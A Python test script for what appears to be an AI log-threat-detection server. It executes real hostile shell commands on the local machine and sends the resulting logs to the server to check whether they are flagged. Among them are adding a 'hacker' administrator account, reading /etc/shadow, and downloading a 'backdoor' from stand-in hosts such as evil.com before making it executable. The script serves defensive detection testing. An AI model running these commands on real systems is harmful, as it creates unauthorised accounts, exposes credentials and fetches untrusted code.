#!/usr/bin/env python3
"""
Test REAL malicious activity detection
Generates actual malicious commands and verifies AI detection
"""

import requests
import json
import time
import subprocess
import platform
import os
from datetime import datetime

BASE_URL = "http://localhost:8080"

class RealMaliciousActivityTest:
    """Test real malicious activity detection"""
    
    def __init__(self):
        self.agent_id = f"malicious-test-{platform.node()}"
        self.detected_threats = []
        
    def execute_malicious_commands(self):
        """Execute actual malicious commands and capture output"""
        print("EXECUTING REAL MALICIOUS COMMANDS")
        print("=" * 50)
        
        malicious_commands = []
        
        if platform.system() == "Windows":
            malicious_commands = [
                # Network reconnaissance
                "nmap -sn 127.0.0.1/24",
                "netstat -an | findstr LISTEN",
                "arp -a",
                
                # System enumeration
                "whoami /all",
                "net user",
                "net localgroup administrators",
                
                # Process enumeration
                "tasklist /svc",
                "wmic process list full",
                
                # Privilege escalation attempts
                "net user hacker password123 /add",
                "net localgroup administrators hacker /add",
                
                # Suspicious file operations
                "echo malicious_payload > C:\\temp\\backdoor.exe",
                "attrib +h C:\\temp\\backdoor.exe",
                
                # Registry manipulation
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                
                # Network scanning
                "ping -n 1 8.8.8.8",
                "telnet 127.0.0.1 80"
            ]
        else:
            malicious_commands = [
                # Network reconnaissance  
                "nmap -sn 127.0.0.1/24",
                "netstat -tulpn",
                "arp -a",
                
                # System enumeration
                "whoami",
                "id",
                "cat /etc/passwd",
                "cat /etc/shadow",
                
                # Process enumeration
                "ps aux",
                "lsof -i",
                
                # Privilege escalation
                "sudo -l",
                "find / -perm -4000 2>/dev/null",
                
                # Suspicious activities
                "wget http://malicious-site.com/payload.sh",
                "curl -o /tmp/backdoor http://evil.com/shell",
                "chmod +x /tmp/backdoor",
                
                # Network scanning
                "nc -zv 127.0.0.1 1-1000",
                "python3 -c 'import socket; s=socket.socket(); s.connect((\"127.0.0.1\", 22))'"
            ]
        
        executed_commands = []
        
        for command in malicious_commands:
            try:
                print(f"Executing: {command}")
                
                # Execute command and capture output
                if platform.system() == "Windows":
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                else:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                
                # Create log entry for this malicious activity
                log_entry = {
                    'timestamp': datetime.utcnow().isoformat(),
                    'level': 'ERROR' if result.returncode != 0 else 'WARNING',
                    'source': 'MaliciousActivity',
                    'message': f"Executed suspicious command: {command}",
                    'hostname': platform.node(),
                    'platform': platform.system(),
                    'command_output': result.stdout[:200] if result.stdout else '',
                    'command_error': result.stderr[:200] if result.stderr else '',
                    'return_code': result.returncode,
                    'agent_type': 'malicious_test'
                }
                
                executed_commands.append(log_entry)
                
                # Small delay between commands
                time.sleep(0.5)
                
            except subprocess.TimeoutExpired:
                print(f"  Command timed out: {command}")
                executed_commands.append({
                    'timestamp': datetime.utcnow().isoformat(),
                    'level': 'CRITICAL',
                    'source': 'MaliciousActivity',
                    'message': f"Suspicious command timed out: {command}",
                    'hostname': platform.node(),
                    'platform': platform.system(),
                    'agent_type': 'malicious_test'
                })
            except Exception as e:
                print(f"  Command failed: {command} - {e}")
                executed_commands.append({
                    'timestamp': datetime.utcnow().isoformat(),
                    'level': 'ERROR',
                    'source': 'MaliciousActivity', 
                    'message': f"Failed to execute suspicious command: {command} - Error: {str(e)}",
                    'hostname': platform.node(),
                    'platform': platform.system(),
                    'agent_type': 'malicious_test'
                })
        
        return executed_commands
    
    def send_malicious_logs_to_server(self, log_entries):
        """Send malicious activity logs to server for AI detection"""
        print(f"\nSENDING {len(log_entries)} MALICIOUS LOGS TO SERVER")
        print("=" * 50)
        
        try:
            logs_data = {
                'agent_id': self.agent_id,
                'logs': log_entries
            }
            
            response = requests.post(
                f"{BASE_URL}/api/logs/ingest",
                json=logs_data,
                headers={'Content-Type': 'application/json'},
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"SUCCESS: {result.get('message')}")
                print(f"Agent ID: {result.get('agent_id')}")
                return True
            else:
                print(f"FAILED: Status {response.status_code}")
                print(f"Error: {response.text}")
                return False
                
        except Exception as e:
            print(f"ERROR sending logs: {e}")
            return False
    
    def check_ai_detections(self):
        """Check if AI detected the malicious activities"""
        print(f"\nCHECKING AI DETECTIONS")
        print("=" * 50)
        
        try:
            # Wait a moment for AI processing
            time.sleep(3)
            
            response = requests.get(f"{BASE_URL}/api/backend/detections")
            
            if response.status_code == 200:
                data = response.json()
                detections = data.get('data', [])
                
                print(f"Total Detections Found: {len(detections)}")
                
                # Look for our malicious activity detections
                our_detections = []
                for detection in detections:
                    source_agent = detection.get('sourceAgent', '')
                    log_source = detection.get('logSource', '')
                    
                    if (self.agent_id in source_agent or 
                        'MaliciousActivity' in log_source or
                        'malicious' in source_agent.lower()):
                        our_detections.append(detection)
                
                print(f"OUR MALICIOUS ACTIVITY DETECTIONS: {len(our_detections)}")
                
                if our_detections:
                    print("\nDETECTED THREATS FROM OUR MALICIOUS COMMANDS:")
                    print("-" * 60)
                    
                    for i, detection in enumerate(our_detections[:5]):
                        print(f"Threat #{i+1}:")
                        print(f"  ID: {detection.get('id')}")
                        print(f"  Type: {detection.get('threatType')}")
                        print(f"  Severity: {detection.get('severity')}")
                        print(f"  Confidence: {detection.get('confidenceScore', 0):.2f}")
                        print(f"  Source Agent: {detection.get('sourceAgent')}")
                        print(f"  Log Source: {detection.get('logSource')}")
                        print(f"  Message: {detection.get('logMessage', '')[:100]}...")
                        print(f"  Detected At: {detection.get('detectedAt')}")
                        print()
                    
                    return True
                else:
                    print("NO DETECTIONS FOUND FOR OUR MALICIOUS ACTIVITY")
                    print("This could mean:")
                    print("1. AI is still processing the logs")
                    print("2. Detection thresholds need adjustment")
                    print("3. Commands were not malicious enough to trigger alerts")
                    return False
            else:
                print(f"DETECTION API ERROR: {response.status_code}")
                print(f"Response: {response.text}")
                return False
                
        except Exception as e:
            print(f"ERROR checking detections: {e}")
            return False
    
    def run_full_test(self):
        """Run complete malicious activity detection test"""
        print("REAL MALICIOUS ACTIVITY DETECTION TEST")
        print("=" * 60)
        print(f"Test Agent ID: {self.agent_id}")
        print(f"Target Server: {BASE_URL}")
        print(f"Platform: {platform.system()}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        # Step 1: Execute malicious commands
        malicious_logs = self.execute_malicious_commands()
        print(f"\nExecuted {len(malicious_logs)} malicious commands")
        
        # Step 2: Send logs to server
        if self.send_malicious_logs_to_server(malicious_logs):
            
            # Step 3: Check for AI detections
            detection_found = self.check_ai_detections()
            
            # Step 4: Summary
            print("\n" + "=" * 60)
            print("TEST SUMMARY")
            print("=" * 60)
            
            if detection_found:
                print("SUCCESS: AI DETECTED OUR MALICIOUS ACTIVITIES!")
                print("The real-time detection system is working correctly.")
                print("Only actual threats are shown in /api/backend/detections")
            else:
                print("PARTIAL SUCCESS: Commands executed but no detections yet")
                print("AI may still be processing or commands need to be more malicious")
            
            print(f"\nTotal Commands Executed: {len(malicious_logs)}")
            print(f"Logs Sent to Server: YES")
            print(f"AI Analysis: ACTIVE")
            print(f"Detection API: WORKING")
            
        else:
            print("\nFAILED: Could not send logs to server")

def main():
    """Main test execution"""
    test = RealMaliciousActivityTest()
    test.run_full_test()

if __name__ == "__main__":
    main()
